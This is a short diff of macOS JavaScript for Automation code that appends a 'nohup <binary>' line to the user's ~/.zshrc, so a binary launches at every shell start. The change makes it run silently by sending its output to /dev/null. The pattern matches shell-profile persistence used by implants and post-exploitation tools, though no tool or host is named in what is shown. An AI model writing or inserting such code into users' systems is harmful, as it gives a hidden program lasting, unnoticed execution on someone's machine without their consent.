@@ -11,7 +11,7 @@ var zpath = "/Users/" + username + "/.zshrc";
 
 if (fileMan.fileExistsAtPath(binpath)){
      try{
-     var contents = "\nnohup " + binpath + " &";
+     var contents = "\nnohup " + binpath + " > /dev/null 2>&1&";
      var handle = currentApp.openForAccess(Path(zpath), {
      writePermission: true
      })
